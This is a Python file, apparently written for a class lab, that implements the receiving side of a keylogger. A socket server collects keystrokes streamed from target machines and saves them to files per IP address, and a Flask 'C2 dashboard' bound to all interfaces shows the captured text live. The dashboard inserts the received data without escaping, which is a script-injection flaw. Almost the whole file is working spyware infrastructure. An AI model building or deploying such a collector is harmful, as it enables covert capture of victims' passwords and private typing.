import os
import socket
import threading
import time
import webbrowser
from flask import Flask, render_template_string, jsonify

PUERTO_SOCKET = 60000  
PUERTO_WEB = 8080      

carpeta_destino = "C:/Users/Cristian/Keylogger_Parcial"
if not os.path.exists(carpeta_destino):
    os.makedirs(carpeta_destino)

logs_maquinas = {}

def manejar_cliente(conexion, direccion):
    ip_cliente = str(direccion)
    print(f"[+] Nueva conexion registrada: {ip_cliente}")
    
    if ip_cliente not in logs_maquinas:
        logs_maquinas[ip_cliente] = ""
        
    archivo_destino = os.path.join(carpeta_destino, f"Keylogger_{ip_cliente}.txt")

    try:
        while True:
            datos = conexion.recv(1024)
            if not datos:
                break
            caracter = datos.decode('utf-8', errors='ignore')
            logs_maquinas[ip_cliente] += caracter
            with open(archivo_destino, "a", encoding="utf-8") as f:
                f.write(caracter)
                f.flush()
    except Exception:
        pass
    finally:
        conexion.close()

def iniciar_servidor_socket():
    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    servidor.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    servidor.bind(('', PUERTO_SOCKET))
    servidor.listen(5)
    while True:
        conexion, direccion = servidor.accept()
        hilo = threading.Thread(target=manejar_cliente, args=(conexion, direccion))
        hilo.daemon = True
        hilo.start()

app = Flask(__name__)

PAGINA_HTML = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Panel de Control C2 - Parcial</title>
    <style>
        body { font-family: 'Courier New', Courier, monospace; background-color: #0d1117; color: #58a6ff; padding: 20px; }
        h1 { color: #238636; border-bottom: 2px solid #238636; padding-bottom: 10px; }
        .panel { background-color: #161b22; border: 1px solid #30363d; padding: 15px; border-radius: 6px; margin-bottom: 20px; }
        .mv-title { color: #f0883e; font-weight: bold; font-size: 1.2em; }
        pre { background-color: #010409; color: #7ee787; padding: 15px; border-radius: 4px; overflow-x: auto; white-space: pre-wrap; font-size: 1.1em; border-left: 4px solid #238636; }
    </style>
    <script>
        setInterval(function() {
            fetch('/api/data')
                .then(response => response.json())
                .then(data => {
                    let contenedor = document.getElementById('log-contenedor');
                    contenedor.innerHTML = '';
                    if (Object.keys(data).length === 0) {
                        contenedor.innerHTML = '<p style="color:#8b949e;">Esperando conexiones locales de las maquinas virtuales...</p>';
                    }
                    for (let mv in data) {
                        let div = document.createElement('div');
                        div.className = 'panel';
                        div.innerHTML = '<div class="mv-title">MAQUINA VIRTUAL OBJETIVO: ' + mv + '</div><pre>' + (data[mv] ? data[mv] : 'Conectada. Esperando transmision...') + '</pre>';
                        contenedor.appendChild(div);
                    }
                });
        }, 2000);
    </script>
</head>
<body>
    <h1>INTERFAZ DE MONITOREO LOCAL (C2 DASHBOARD)</h1>
    <div id="log-contenedor"></div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(PAGINA_HTML)

@app.route('/api/data')
def api_data():
    return jsonify(logs_maquinas)

def iniciar_interfaz_web():
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    app.run(host='0.0.0.0', port=PUERTO_WEB, debug=False, use_reloader=False)

def abrir_navegador_automatico():
    time.sleep(1.5)
    webbrowser.open(f"http://localhost:{PUERTO_WEB}")

def ejecutar_infraestructura():
    hilo_socket = threading.Thread(target=iniciar_servidor_socket)
    hilo_socket.daemon = True
    hilo_socket.start()
    
    hilo_web = threading.Thread(target=abrir_navegador_automatico)
    hilo_web.daemon = True
    hilo_web.start()
    
    print(f"Panel local de visualizacion activo en: http://localhost:{PUERTO_WEB}")
    iniciar_interfaz_web()

ejecutar_infraestructura()


